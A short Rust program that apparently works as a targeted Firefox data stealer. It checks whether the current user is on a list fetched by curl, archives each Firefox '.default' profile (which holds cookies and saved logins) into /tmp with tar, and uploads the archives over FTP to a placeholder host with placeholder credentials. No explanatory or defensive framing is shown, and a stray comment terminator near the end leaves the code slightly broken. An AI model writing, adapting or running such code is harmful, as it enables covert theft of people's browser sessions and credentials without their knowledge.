use std::fs;
use std::process;
use std::path::Path;
use std::path::PathBuf;
use std::time::{SystemTime, UNIX_EPOCH};

fn run_command(command : &str, argument : &str) -> String {
    let output_utf8 = process::Command::new(command)
                      .arg(argument)
                      .output()
                      .expect("Failed to execute");
    String::from_utf8_lossy(&output_utf8.stdout).into_owned()
}

fn get_profile_path(firefox_path: PathBuf) -> Vec<String> {
    let dirs           : fs::ReadDir = fs::read_dir(firefox_path).unwrap();
    let mut profiles   : Vec<String> = Vec::new();
    let mut line       : PathBuf;
    let mut filepath   : String;

    for dir in dirs {
        line       = dir.unwrap().path();
        filepath   = line.to_string_lossy().to_string();
        if filepath.contains(".default") && Path::new(&line).exists() {
            profiles.push(format!("{}", &filepath));
        }
    }

    profiles
}

fn main() {
    let username      : String      = run_command("id", "-un").replace("\n", "");
    let targets       : String      = run_command("curl", "http://localhost/user.txt");
    let firefox_path  : &PathBuf    = &[&std::env::var("HOME").unwrap(), ".mozilla", "firefox"].iter().collect();
    let profiles      : Vec<String> = get_profile_path(firefox_path.to_path_buf());
    let targets_vec   : Vec<&str>   = targets.lines().collect();
    let in_target     : bool        = targets_vec.contains(&&*username);
    let time_now      : SystemTime  = SystemTime::now();
    let mut time      : String      = format!("{:?}", time_now.duration_since(UNIX_EPOCH).unwrap());

    time.split_off(10);

    if !in_target || !Path::new(firefox_path).exists() {
        process::exit(1);
    }


    for (index, profile) in profiles.iter().enumerate() {
        process::Command::new("tar")
        .arg("cjf")
        .arg(format!("/tmp/{}-{}-{}.tar.bz2", username, index+1, time))
        .arg(format!("{}", profile))
        .spawn()
        .expect("Failed to execute");
        
        process::Command::new("curl")
        .arg("-sT")
        .arg(format!("/tmp/{}-{}-{}.tar.bz2", username, index+1, time))
        .arg("ftp://host/directory/")
        .arg("--user")
        .arg("username:password")
        .spawn()
        .expect("Failed to execute");*/
    }
}
